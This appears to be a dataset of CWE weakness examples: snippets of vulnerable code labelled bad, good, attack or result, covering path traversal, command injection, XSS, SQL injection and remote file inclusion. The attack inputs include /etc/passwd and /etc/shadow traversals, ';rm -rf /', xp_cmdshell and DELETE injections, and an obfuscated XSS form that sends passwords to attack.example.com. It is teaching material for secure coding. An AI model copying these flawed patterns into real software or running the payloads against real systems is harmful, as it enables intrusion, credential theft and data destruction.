5,
6,"
example: 1
NATURE:bad:
LANGUAGE:XML:
                  
<sun-web-app>
...
<session-config>
<session-properties>
<property name=""idLengthBytes"" value=""8"">
<description>The number of bytes in this web module's session ID.</description>
</property>
</session-properties>
</session-config>
...
</sun-web-app>

               "
7,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
Public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
try {
...
} catch (ApplicationSpecificException ase) {
logger.error(""Caught: "" + ase.toString());
}
}

               "
8,"
example: 1
NATURE:bad:
LANGUAGE:XML:
                  
<ejb-jar>
<enterprise-beans>
<entity>
<ejb-name>EmployeeRecord</ejb-name>
<home>com.wombat.empl.EmployeeRecordHome</home>
<remote>com.wombat.empl.EmployeeRecord</remote>
...
</entity>
...
</enterprise-beans>
</ejb-jar>

               "
9,"
example: 1
NATURE:bad:
LANGUAGE:XML:
                  
<ejb-jar>
...
<assembly-descriptor>
<method-permission>
<role-name>ANYONE</role-name>
<method>
<ejb-name>Employee</ejb-name>
<method-name>getSalary</method-name>
</method-permission>
</assembly-descriptor>
...
</ejb-jar>

               "
11,"
example: 1
NATURE:bad:
LANGUAGE:XML:
                  
<?xml version=""1.0"" encoding=""utf-8"" ?>
<configuration>
<system.web>
<compilation
defaultLanguage=""c#""
debug=""true""
/>
...
</system.web>
</configuration>

               "
12,"
example: 1
NATURE:bad:
LANGUAGE:ASP.NET:
                  
<customErrors mode=""Off"" />

               
example: 2
NATURE:good:
LANGUAGE:ASP.NET:
                  
<customErrors mode=""RemoteOnly"" />

               
example: 3
NATURE:good:
LANGUAGE:ASP.NET:
                  
<customErrors mode=""On"" defaultRedirect=""YourErrorPage.htm"" />

               "
13,"
example: 1
NATURE:bad:
LANGUAGE:ASP.NET:
                  
...
<connectionStrings>
<add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" />
</connectionStrings>
...

               "
14,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
void GetData(char *MFAddr) {

                        
char pwd[64];
if (GetPasswordFromUser(pwd, sizeof(pwd))) {

                              

                                 
if (ConnectToMainframe(MFAddr, pwd)) {

                                    

                                       

                                       
// Interaction with mainframe

                                       

                                    

                                 
}

                           
}
memset(pwd, 0, sizeof(pwd));

                     
}

               "
15,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
...
sethostid(argv[1]);
...

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
...
conn.setCatalog(request.getParameter(""catalog""));
...

               "
20,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
...
public static final double price = 20.00;
int quantity = currentUser.getAttribute(""quantity"");
double total = price * quantity;
chargeUser(total);
...

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
...
#define MAX_DIM 100
...

                     
/* board dimensions */

                     

                     
int m,n, error;
board_square_t *board;
printf(""Please specify the board height: \n"");
error = scanf(""%d"", &m);
if ( EOF == error ){
die(""No integer passed: Die evil hacker!\n"");
}
printf(""Please specify the board width: \n"");
error = scanf(""%d"", &n);
if ( EOF == error ){
die(""No integer passed: Die evil hacker!\n"");
}
if ( m > MAX_DIM || n > MAX_DIM ) {
die(""Value too large: Die evil hacker!\n"");
}
board = (board_square_t*) malloc( m * n * sizeof(board_square_t));
...

               
example: 3
NATURE:bad:
LANGUAGE:PHP:
                  
$birthday = $_GET['birthday'];
$homepage = $_GET['homepage'];
echo ""Birthday: $birthday<br>Homepage: <a href=$homepage>click here</a>""

               
example: 4
NATURE:attack:
                  
2009-01-09--

               
example: 5
NATURE:bad:
LANGUAGE:C:
                  
void parse_data(char *untrusted_input){

                        
int m, n, error;
error = sscanf(untrusted_input, ""%d:%d"", &m, &n);
if ( EOF == error ){
die(""Did not specify integer value. Die evil hacker!\n"");
}

                           
/* proceed assuming n and m are initialized correctly */

                           

                        

                     
}

               
example: 6
NATURE:attack:
                  
123:

               
example: 7
NATURE:bad:
LANGUAGE:Java:
                  
private void buildList ( int untrustedListSize ){
if ( 0 > untrustedListSize ){
die(""Negative value supplied for list size, die evil hacker!"");
}
Widget[] list = new Widget [ untrustedListSize ];
list[0] = new Widget();
}

               
example: 8
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
...

                     
IntentFilter filter = new IntentFilter(""com.example.URLHandler.openURL"");
MyReceiver receiver = new MyReceiver();
registerReceiver(receiver, filter);

                     
...

                     

                     
public class UrlHandlerReceiver extends BroadcastReceiver {

                        
@Override
public void onReceive(Context context, Intent intent) {

                              
if(""com.example.URLHandler.openURL"".equals(intent.getAction())) {
String URL = intent.getStringExtra(""URLToOpen"");
int length = URL.length();

                                 

                                 
...

                                 
}

                           
}

                     
}

               "
22,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $dataPath = ""/users/cwe/profiles"";
my $username = param(""user"");
my $profilePath = $dataPath . ""/"" . $username;

                     
open(my $fh, ""<$profilePath"") || ExitError(""profile read error: $profilePath"");
print ""<ul>\n"";
while (<$fh>) {
print ""<li>$_</li>\n"";
}
print ""</ul>\n"";

               
example: 2
NATURE:attack:
                  
../../../etc/passwd

               
example: 3
NATURE:result:
                  
/users/cwe/profiles/../../../etc/passwd

               
example: 4
NATURE:result:
                  
/etc/passwd

               
example: 5
NATURE:bad:
LANGUAGE:Java:
                  
String filename = System.getProperty(""com.domain.application.dictionaryFile"");
File dictionaryFile = new File(filename);

               
example: 6
NATURE:bad:
LANGUAGE:Perl:
                  
my $Username = GetUntrustedInput();
$Username =~ s/\.\.\///;
my $filename = ""/home/user/"" . $Username;
ReadAndSendFile($filename);

               
example: 7
NATURE:attack:
                  
../../../etc/passwd

               
example: 8
NATURE:result:
                  
../../etc/passwd

               
example: 9
NATURE:result:
                  
/home/user/../../etc/passwd

               
example: 10
NATURE:bad:
LANGUAGE:Java:
                  
String path = getInputPath();
if (path.startsWith(""/safe_dir/""))
{
File f = new File(path);
f.delete()
}

               
example: 11
NATURE:attack:
                  
/safe_dir/../important.dat

               
example: 12
NATURE:good:
LANGUAGE:HTML:
                  
<form action=""FileUploadServlet"" method=""post"" enctype=""multipart/form-data"">

                        
Choose a file to upload:

                        
<input type=""file"" name=""filename""/>
<br/>
<input type=""submit"" name=""submit"" value=""Submit""/>

                     
</form>

               
example: 13
NATURE:bad:
LANGUAGE:Java:
                  
public class FileUploadServlet extends HttpServlet {

                        
...

                        
protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
response.setContentType(""text/html"");
PrintWriter out = response.getWriter();
String contentType = request.getContentType();

                           

                           
// the starting position of the boundary header

                           
int ind = contentType.indexOf(""boundary="");
String boundary = contentType.substring(ind+9);

                           
String pLine = new String();
String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value

                           

                           
// verify that content type is multipart form data

                           
if (contentType != null && contentType.indexOf(""multipart/form-data"") != -1) {

                              
// extract the filename from the Http header
BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));
...
pLine = br.readLine();
String filename = pLine.substring(pLine.lastIndexOf(""\\""), pLine.lastIndexOf(""\""""));
...

                              

                              
// output the file to the local upload directory

                              
try {
BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));
for (String line; (line=br.readLine())!=null; ) {
if (line.indexOf(boundary) == -1) {
bw.write(line);
bw.newLine();
bw.flush();
}
} //end of for loop
bw.close();
} catch (IOException ex) {...}

                              

                              
// output successful upload response HTML page

                              

                              

                           
}

                           
// output unsuccessful upload response HTML page

                           
else
{...}
}

                           
...

                        

                     
}

               "
23,"
example: 1
NATURE:bad:
                  
http://example.com.br/get-files.jsp?file=report.pdf
http://example.com.br/get-page.php?home=aaa.html
http://example.com.br/some-page.asp?page=index.html

               
example: 2
NATURE:attack:
                  
http://example.com.br/get-files?file=../../../../somedir/somefile
http://example.com.br/../../../../etc/shadow
http://example.com.br/get-files?file=../../../../etc/passwd

               
example: 3
NATURE:bad:
LANGUAGE:Perl:
                  
my $dataPath = ""/users/cwe/profiles"";
my $username = param(""user"");
my $profilePath = $dataPath . ""/"" . $username;

                     
open(my $fh, ""<$profilePath"") || ExitError(""profile read error: $profilePath"");
print ""<ul>\n"";
while (<$fh>) {
print ""<li>$_</li>\n"";
}
print ""</ul>\n"";

               
example: 4
NATURE:attack:
                  
../../../etc/passwd

               
example: 5
NATURE:result:
                  
/users/cwe/profiles/../../../etc/passwd

               
example: 6
NATURE:result:
                  
/etc/passwd

               
example: 7
NATURE:good:
LANGUAGE:HTML:
                  
<form action=""FileUploadServlet"" method=""post"" enctype=""multipart/form-data"">

                     
Choose a file to upload:
<input type=""file"" name=""filename""/>
<br/>
<input type=""submit"" name=""submit"" value=""Submit""/>

                     
</form>

               
example: 8
NATURE:bad:
LANGUAGE:Java:
                  
public class FileUploadServlet extends HttpServlet {

                     

                        
...

                           
protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

                           

                              
response.setContentType(""text/html"");
PrintWriter out = response.getWriter();
String contentType = request.getContentType();

                                 
// the starting position of the boundary header
int ind = contentType.indexOf(""boundary="");
String boundary = contentType.substring(ind+9);

                                 
String pLine = new String();
String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value

                                 
// verify that content type is multipart form data
if (contentType != null && contentType.indexOf(""multipart/form-data"") != -1) {

                                 

                                    
// extract the filename from the Http header
BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));
...
pLine = br.readLine();
String filename = pLine.substring(pLine.lastIndexOf(""\\""), pLine.lastIndexOf(""\""""));
...

                                       
// output the file to the local upload directory
try {

                                          
BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));
for (String line; (line=br.readLine())!=null; ) {
if (line.indexOf(boundary) == -1) {
bw.write(line);
bw.newLine();
bw.flush();
}
} //end of for loop
bw.close();

                                       

                                       

                                       
} catch (IOException ex) {...}
// output successful upload response HTML page

                                 
}
// output unsuccessful upload response HTML page
else
{...}

                           
}
...

                        

                     
}

               "
24,
25,
26,
27,
28,
29,
30,
31,
32,
33,
34,
35,
36,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String filename = System.getProperty(""com.domain.application.dictionaryFile"");
File dictionaryFile = new File(filename);

               
example: 2
NATURE:good:
LANGUAGE:HTML:
                  
<form action=""FileUploadServlet"" method=""post"" enctype=""multipart/form-data"">

                     
Choose a file to upload:
<input type=""file"" name=""filename""/>
<br/>
<input type=""submit"" name=""submit"" value=""Submit""/>

                     
</form>

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
public class FileUploadServlet extends HttpServlet {

                     

                        
...

                           
protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

                           

                              
response.setContentType(""text/html"");
PrintWriter out = response.getWriter();
String contentType = request.getContentType();

                                 
// the starting position of the boundary header
int ind = contentType.indexOf(""boundary="");
String boundary = contentType.substring(ind+9);

                                 
String pLine = new String();
String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value

                                 
// verify that content type is multipart form data
if (contentType != null && contentType.indexOf(""multipart/form-data"") != -1) {

                                 

                                    
// extract the filename from the Http header
BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));
...
pLine = br.readLine();
String filename = pLine.substring(pLine.lastIndexOf(""\\""), pLine.lastIndexOf(""\""""));
...

                                       
// output the file to the local upload directory
try {

                                          
BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));
for (String line; (line=br.readLine())!=null; ) {
if (line.indexOf(boundary) == -1) {
bw.write(line);
bw.newLine();
bw.flush();
}
} //end of for loop
bw.close();

                                       

                                       

                                       
} catch (IOException ex) {...}
// output successful upload response HTML page

                                 
}
// output unsuccessful upload response HTML page
else
{...}

                           
}
...

                        

                     
}

               "
37,
38,
39,
40,
41,
42,
43,
44,
45,
46,
47,
48,
49,
50,
51,
52,
53,
54,
55,
56,
57,
58,
59,
61,
62,
64,
65,
66,
67,
69,
72,
73,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String rName = request.getParameter(""reportName"");
File rFile = new File(""/usr/local/apfr/reports/"" + rName);
...
rFile.delete();

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
fis = new FileInputStream(cfg.getProperty(""sub"")+"".txt"");
amt = fis.read(arr);
out.println(arr);

               "
74,
75,
76,
77,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int main(int argc, char** argv) {
char cmd[CMD_MAX] = ""/usr/bin/cat "";
strcat(cmd, argv[1]);
system(cmd);
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
...
String btype = request.getParameter(""backuptype"");
String cmd = new String(""cmd.exe /K \""
c:\\util\\rmanDB.bat ""
+btype+
""&&c:\\utl\\cleanup.bat\"""")

                     
System.Runtime.getRuntime().exec(cmd);
...

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
...
String home = System.getProperty(""APPHOME"");
String cmd = home + INITCMD;
java.lang.Runtime.getRuntime().exec(cmd);
...

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  
#include <stdio.h>
#include <unistd.h>

                     
int main(int argc, char **argv) {

                        

                           
char cat[] = ""cat "";
char *command;
size_t commandLength;

                           
commandLength = strlen(cat) + strlen(argv[1]) + 1;
command = (char *) malloc(commandLength);
strncpy(command, cat, commandLength);
strncat(command, argv[1], (commandLength - strlen(cat)) );

                           
system(command);
return (0);

                     
}

               
example: 5
NATURE:informative:
                  
$ ./catWrapper Story.txt
When last we left our heroes...

               
example: 6
NATURE:attack:
                  
$ ./catWrapper Story.txt; ls
When last we left our heroes...
Story.txt
SensitiveFile.txt
PrivateData.db
a.out*

               "
78,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$userName = $_POST[""user""];
$command = 'ls -l /home/' . $userName;
system($command);

               
example: 2
NATURE:attack:
                  
;rm -rf /

               
example: 3
NATURE:result:
                  
ls -l /home/;rm -rf /

               
example: 4
NATURE:bad:
LANGUAGE:Perl:
                  
use CGI qw(:standard);
$name = param('name');
$nslookup = ""/path/to/nslookup"";
print header;
if (open($fh, ""$nslookup $name|"")) {
while (<$fh>) {
print escapeHTML($_);
print ""<br>\n"";
}
close($fh);
}

               
example: 5
NATURE:attack:
                  
cwe.mitre.org%20%3B%20/bin/ls%20-l

               
example: 6
NATURE:result:
                  
/path/to/nslookup cwe.mitre.org ; /bin/ls -l

               
example: 7
NATURE:bad:
LANGUAGE:Java:
                  
String script = System.getProperty(""SCRIPTNAME"");
if (script != null)
System.exec(script);

                  

               
example: 8
NATURE:bad:
LANGUAGE:Java:
                  
public String coordinateTransformLatLonToUTM(String coordinates)
{

                        
String utmCoords = null;
try {

                              
String latlonCoords = coordinates;
Runtime rt = Runtime.getRuntime();
Process exec = rt.exec(""cmd.exe /C latlon2utm.exe -"" + latlonCoords);

                                 
// process results of coordinate transform

                                 

                                 

                                 
// ...

                                 

                              

                           
}
catch(Exception e) {...}
return utmCoords;

                     
}

               
example: 9
NATURE:bad:
LANGUAGE:Java:
                  
...
String btype = request.getParameter(""backuptype"");
String cmd = new String(""cmd.exe /K \""
c:\\util\\rmanDB.bat ""
+btype+
""&&c:\\utl\\cleanup.bat\"""")

                     
System.Runtime.getRuntime().exec(cmd);
...

               "
79,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$username = $_GET['username'];
echo '<div class=""header""> Welcome, ' . $username . '</div>';

               
example: 2
NATURE:attack:
                  
http://trustedSite.example.com/welcome.php?username=<Script Language=""Javascript"">alert(""You've been attacked!"");</Script>

               
example: 3
NATURE:attack:
                  
http://trustedSite.example.com/welcome.php?username=<div id=""stealPassword"">Please Login:<form name=""input"" action=""http://attack.example.com/stealPassword.php"" method=""post"">Username: <input type=""text"" name=""username"" /><br/>Password: <input type=""password"" name=""password"" /><br/><input type=""submit"" value=""Login"" /></form></div>

               
example: 4
NATURE:result:
                  
<div class=""header""> Welcome, <div id=""stealPassword""> Please Login:

                        
<form name=""input"" action=""attack.example.com/stealPassword.php"" method=""post"">
Username: <input type=""text"" name=""username"" /><br/>
Password: <input type=""password"" name=""password"" /><br/>
<input type=""submit"" value=""Login"" />
</form>

                     
</div></div>

               
example: 5
NATURE:attack:
                  
trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22
stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input
%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php
%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text
%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A
+%3Cinput+type%3D%22password%22+name%3D%22password%22
+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22
+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A

               
example: 6
NATURE:attack:
                  
trustedSite.example.com/welcome.php?username=<script+type=""text/javascript"">
document.write('\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073
\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064
\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067
\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D
\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063
\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F
\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D
\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061
\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068
\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070
\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D
\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079
\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061
\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065
\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073
\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075
\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073
\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022
\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E
\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D
\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C
\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F
\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D');</script>

               
example: 7
NATURE:bad:
LANGUAGE:JSP:
                  
<% String eid = request.getParameter(""eid""); %>
...
Employee ID: <%= eid %>

               
example: 8
NATURE:bad:
LANGUAGE:ASP.NET:
                  
<%
protected System.Web.UI.WebControls.TextBox Login;
protected System.Web.UI.WebControls.Label EmployeeID;
...
EmployeeID.Text = Login.Text;
%>

                     
<p><asp:label id=""EmployeeID"" runat=""server"" /></p>

               
example: 9
NATURE:bad:
LANGUAGE:JSP:
                  
<%Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid);
if (rs != null) {
rs.next();
String name = rs.getString(""name"");
}%>

                     
Employee Name: <%= name %>

               
example: 10
NATURE:bad:
LANGUAGE:ASP.NET:
                  
<%
protected System.Web.UI.WebControls.Label EmployeeName;
...
string query = ""select * from emp where id="" + eid;
sda = new SqlDataAdapter(query, conn);
sda.Fill(dt);
string name = dt.Rows[0][""Name""];
...
EmployeeName.Text = name;%>
<p><asp:label id=""EmployeeName"" runat=""server"" /></p>

               
example: 11
NATURE:bad:
LANGUAGE:PHP:
                  
$username = mysql_real_escape_string($username);
$fullName = mysql_real_escape_string($fullName);
$query = sprintf('Insert Into users (username,password) Values (""%s"",""%s"",""%s"")', $username, crypt($password),$fullName) ;
mysql_query($query);
/.../

               
example: 12
NATURE:bad:
LANGUAGE:PHP:
                  
$query = 'Select * From users Where loggedIn=true';
$results = mysql_query($query);

                     
if (!$results) {
exit;
}

                     

                     
//Print list of users to page

                     
echo '<div id=""userlist"">Currently Active Users:';
while ($row = mysql_fetch_assoc($results)) {
echo '<div class=""userNames"">'.$row['fullname'].'</div>';
}
echo '</div>';

               
example: 13
NATURE:bad:
LANGUAGE:PHP:
                  
$name = $_COOKIE[""myname""];
$announceStr = ""$name just logged in."";

                     

                     
//save HTML-formatted message to file; implementation details are irrelevant for this example.

                     

				saveMessage($announceStr);

               
example: 14
NATURE:attack:
                  
<script>document.alert('Hacked');</script>

               
example: 15
NATURE:result:
                  
<script>document.alert('Hacked');</script> has logged in.

               "
80,"
example: 1
NATURE:bad:
LANGUAGE:JSP:
                  
<% for (Iterator i = guestbook.iterator(); i.hasNext(); ) {
Entry e = (Entry) i.next(); %>
<p>Entry #<%= e.getId() %></p>
<p><%= e.getText() %></p>
<%
} %>

                  

               "
81,
82,
83,
84,
85,
86,
87,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public String preventXSS(String input, String mask) {
return input.replaceAll(""script"", mask);
}

               "
88,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int main(int argc, char** argv) {
char cmd[CMD_MAX] = ""/usr/bin/cat "";
strcat(cmd, argv[1]);
system(cmd);
}

               "
89,"
example: 1
NATURE:bad:
LANGUAGE:C#:
                  
...
string userName = ctx.getAuthenticatedUserName();
string query = ""SELECT * FROM items WHERE owner = '"" + userName + ""' AND itemname = '"" + ItemName.Text + ""'"";
sda = new SqlDataAdapter(query, conn);
DataTable dt = new DataTable();
sda.Fill(dt);
...

               
example: 2
NATURE:informative:
                  
SELECT * FROM items WHERE owner = <userName> AND itemname = <itemName>;

               
example: 3
NATURE:attack:
                  
name' OR 'a'='a

               
example: 4
NATURE:attack:
                  
SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';

               
example: 5
NATURE:attack:
                  
OR 'a'='a

               
example: 6
NATURE:attack:
                  
SELECT * FROM items;

               
example: 7
NATURE:attack:
                  
name'; DELETE FROM items; --

               
example: 8
NATURE:attack:
LANGUAGE:SQL:
                  
SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';
DELETE FROM items;

                     
--'

                     

                  

               
example: 9
NATURE:attack:
                  
name'; DELETE FROM items; SELECT * FROM items WHERE 'a'='a

               
example: 10
NATURE:attack:
                  
SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';
DELETE FROM items;
SELECT * FROM items WHERE 'a'='a';

               
example: 11
NATURE:bad:
                  
procedure get_item ( itm_cv IN OUT ItmCurTyp, usr in varchar2, itm in varchar2)
is open itm_cv for
' SELECT * FROM items WHERE ' || 'owner = '|| usr || ' AND itemname = ' || itm || ';
end get_item;

               
example: 12
NATURE:bad:
                  
SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='$user_input' ORDER BY PRICE

               
example: 13
NATURE:attack:
                  
'; exec master..xp_cmdshell 'dir' --

               
example: 14
NATURE:attack:
                  
SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=''; exec master..xp_cmdshell 'dir' --' ORDER BY PRICE

               
example: 15
NATURE:bad:
LANGUAGE:PHP:
                  
$id = $_COOKIE[""mid""];
mysql_query(""SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'"");

               
example: 16
NATURE:attack:
                  
1432' or '1' = '1

               
example: 17
NATURE:result:
                  
SELECT MessageID, Subject FROM messages WHERE MessageID = '1432' or '1' = '1'

               
example: 18
NATURE:good:
LANGUAGE:PHP:
                  
$id = intval($_COOKIE[""mid""]);
mysql_query(""SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'"");

               
example: 19
NATURE:bad:
LANGUAGE:Perl:
                  
$userKey = getUserID();
$name = getUserInput();

                     

                     
# ensure only letters, hyphens and apostrophe are allowed

                     
$name = whiteList($name, ""^a-zA-z'-$"");
$query = ""INSERT INTO last_names VALUES('$userKey', '$name')"";

               "
90,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
context = new InitialDirContext(env);
String searchFilter = ""StreetAddress="" + address;
NamingEnumeration answer = context.search(searchBase, searchFilter, searchCtls);

               "
91,
93,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
logger.info(""User's street address: "" + request.getParameter(""streetAddress""));

               "
94,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$MessageFile = ""cwe-94/messages.out"";
if ($_GET[""action""] == ""NewMessage"") {
$name = $_GET[""name""];
$message = $_GET[""message""];
$handle = fopen($MessageFile, ""a+"");
fwrite($handle, ""<b>$name</b> says '$message'<hr>\n"");
fclose($handle);
echo ""Message Saved!<p>\n"";
}
else if ($_GET[""action""] == ""ViewMessages"") {
include($MessageFile);
}

               
example: 2
NATURE:attack:
                  
name=h4x0r
message=%3C?php%20system(%22/bin/ls%20-l%22);?%3E

               
example: 3
NATURE:attack:
                  
<?php system(""/bin/ls -l"");?>

               
example: 4
NATURE:bad:
LANGUAGE:Perl:
                  
use CGI qw(:standard);

                     
sub config_file_add_key {

                        
my ($fname, $key, $arg) = @_;

                           

                           
# code to add a field/key to a file goes here

                           

                        

                     
}

                     
sub config_file_set_key {

                        
my ($fname, $key, $arg) = @_;

                           

                           
# code to set key to a particular file goes here

                           

                        

                     
}

                     
sub config_file_delete_key {

                        
my ($fname, $key, $arg) = @_;

                           

                           
# code to delete key from a particular file goes here

                           

                        

                     
}

                     
sub handleConfigAction {

                        
my ($fname, $action) = @_;
my $key = param('key');
my $val = param('val');

                           

                           
# this is super-efficient code, especially if you have to invoke

                           

                           

                           

                           
# any one of dozens of different functions!

                           

                           
my $code = ""config_file_$action_key(\$fname, \$key, \$val);"";
eval($code);

                     
}

                     
$configfile = ""/home/cwe/config.txt"";
print header;
if (defined(param('action'))) {
handleConfigAction($configfile, param('action'));
}
else {
print ""No action specified!\n"";
}

               "
95,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
use CGI qw(:standard);

                     
sub config_file_add_key {

                        
my ($fname, $key, $arg) = @_;

                           

                           
# code to add a field/key to a file goes here

                           

                        

                     
}

                     
sub config_file_set_key {

                        
my ($fname, $key, $arg) = @_;

                           

                           
# code to set key to a particular file goes here

                           

                        

                     
}

                     
sub config_file_delete_key {

                        
my ($fname, $key, $arg) = @_;

                           

                           
# code to delete key from a particular file goes here

                           

                        

                     
}

                     
sub handleConfigAction {

                        
my ($fname, $action) = @_;
my $key = param('key');
my $val = param('val');

                           

                           
# this is super-efficient code, especially if you have to invoke

                           

                           

                           

                           
# any one of dozens of different functions!

                           

                           
my $code = ""config_file_$action_key(\$fname, \$key, \$val);"";
eval($code);

                     
}

                     
$configfile = ""/home/cwe/config.txt"";
print header;
if (defined(param('action'))) {
handleConfigAction($configfile, param('action'));
}
else {
print ""No action specified!\n"";
}

               
example: 2
NATURE:attack:
                  
add_key("","",""); system(""/bin/ls"");

               
example: 3
NATURE:result:
                  
config_file_add_key("","",""); system(""/bin/ls"");

               "
96,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$MessageFile = ""cwe-94/messages.out"";
if ($_GET[""action""] == ""NewMessage"") {
$name = $_GET[""name""];
$message = $_GET[""message""];
$handle = fopen($MessageFile, ""a+"");
fwrite($handle, ""<b>$name</b> says '$message'<hr>\n"");
fclose($handle);
echo ""Message Saved!<p>\n"";
}
else if ($_GET[""action""] == ""ViewMessages"") {
include($MessageFile);
}

               
example: 2
NATURE:attack:
                  
name=h4x0r
message=%3C?php%20system(%22/bin/ls%20-l%22);?%3E

               
example: 3
NATURE:attack:
                  
<?php system(""/bin/ls -l"");?>

               "
97,
98,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$dir = $_GET['module_name'];
include($dir . ""/function.php"");

               
example: 2
NATURE:attack:
                  
victim.php?module_name=http://malicious.example.com

               
example: 3
NATURE:bad:
                  
system($_GET['cmd']);

               
example: 4
NATURE:attack:
                  
victim.php?module_name=http://malicious.example.com&cmd=/bin/ls%20-l

               
example: 5
NATURE:attack:
                  
/bin/ls -l

               "
99,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String rName = request.getParameter(""reportName"");
File rFile = new File(""/usr/local/apfr/reports/"" + rName);
...
rFile.delete();

               
example: 2
NATURE:bad:
LANGUAGE:C++:
                  
ifstream ifs(argv[0]);
string s;
ifs >> s;
cout << s;

               "
102,"
example: 1
NATURE:bad:
LANGUAGE:XML:
                  
<form-validation>
<formset>
<form name=""ProjectForm""> ... </form>
<form name=""ProjectForm""> ... </form>
</formset>
</form-validation>

               "
103,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {

                     
// private variables for registration form
private String name;
private String email;
...

                        
public RegistrationForm() {
super();
}

                        
public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {
ActionErrors errors = new ActionErrors();
if (getName() == null || getName().length() < 1) {
errors.add(""name"", new ActionMessage(""error.name.required""));
}
return errors;
}

                     

                     
// getter and setter methods for private variables
...

                     
}

               
example: 2
NATURE:good:
LANGUAGE:Java:
                  
public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {

                     

                        
// private variables for registration form
private String name;
